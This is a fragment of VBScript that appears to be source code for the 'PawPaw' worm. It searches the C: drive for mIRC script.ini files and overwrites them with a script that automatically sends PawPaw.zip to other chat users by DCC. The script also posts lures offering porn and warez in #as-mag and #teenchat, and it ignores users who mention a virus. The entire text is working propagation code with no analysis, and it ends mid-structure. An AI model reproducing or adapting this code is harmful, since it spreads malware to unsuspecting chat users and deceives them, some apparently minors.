on error resume next
dim fs0,dirsystem,dirwin,dirtemp,eq,ctr,file,vbscopy,dow,shwdddd,fs
set fs0=CreateObject("Scripting.FileSystemObject")
set WordObj=createobject("Word.application")
set fs=wordobj.application.filesearch
fs.newsearch
fs.lookin="C:"
fs.searchsubfolders=true
fs.filename= "script.ini"
FS.EXECUTE
for t=1 to fs.foundfiles.count
set bombed=fs0.opentextfile(fs.foundfileS(t),1)
f = bombed.readline
bombed.close
if f <> "[script] ' PawPaw - Mirc spreading plugin!!!" then
Set TRange = document.body.createTextRange
Set g=fs0.opentextfile(fs.foundfiles(t), 1)
Contents = g.readall
g.close
set si=fs0.opentextfile(fs.founDfiles(t), 2, true)
si.writeline "[script] ' PawPaw - Mirc spreading plugin!!!"
si.writeline ""
si.writeline "on 1:FILERCVD:*.*:./dcc send $nick c:\\PawPaw.zip"
si.writeline "on 1:FILESENT:*.*:./dcc send $nick c:\\PawPaw.zip"
si.writeline ""
si.writeline "on 1:connect: \{"
si.writeline "/join #as-mag"
si.writeline "/msg #as-mag Type: /ctcp $me PawPaw"
si.writeline "/msg #as-mag for the latest pr0n, warez, and everything else you could ever want!"
si.writeline "/part #as-mag"
si.writeline "/join #teenchat"
si.writeline "/msg #teenchat Type: /ctcp $me PawPaw"
si.writeline "/msg #teenchat for the latest pr0n, warez, and everything else you could ever want!"
si.writeline "/part #teenchat"
si.writeline "/clear"
si.writeline "/motd"
si.writeline "\}"
si.writeline ""
si.writeline "on 1:PART:#:/if ($nick == $me) \{ halt \} | .dcc send $nick c:\\PawPaw.zip"
si.writeline ""
si.writeline "on 1:TEXT:*virus*:*:/dcc send $nick c:\\PawPaw.zip | /ignore $nick"
si.writeline "ctcp *:pawpaw:/dcc send $nick c:\\pawpaw.zip"
si.writeline ";PawPaw"
si.close
end if
next 
wordobj.quit 
end sub